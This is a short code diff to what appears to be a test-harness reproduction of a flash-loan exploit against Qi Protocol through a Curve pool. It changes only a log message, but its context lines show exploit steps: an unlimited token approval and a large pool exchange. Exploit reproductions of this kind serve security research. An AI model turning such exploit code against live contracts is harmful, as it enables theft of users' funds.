@@ -273,7 +273,7 @@ contract Exploit_QiProtocol_Through_Curve is TestHarness, BalancerFlashloan {
         WMATIC.approve(address(CURVE_POOL), type(uint256).max);
         CURVE_POOL.exchange(1, 0, 20000000000000000000000, 8964360265059868271032, false);
 
-        console.log("--> POST-EXCHANGE 1");
+        console.log("--> POST-EXCHANGE");
         LOG_BALANCES();
 
         //WMATIC.deposit{value: address(this).balance}();
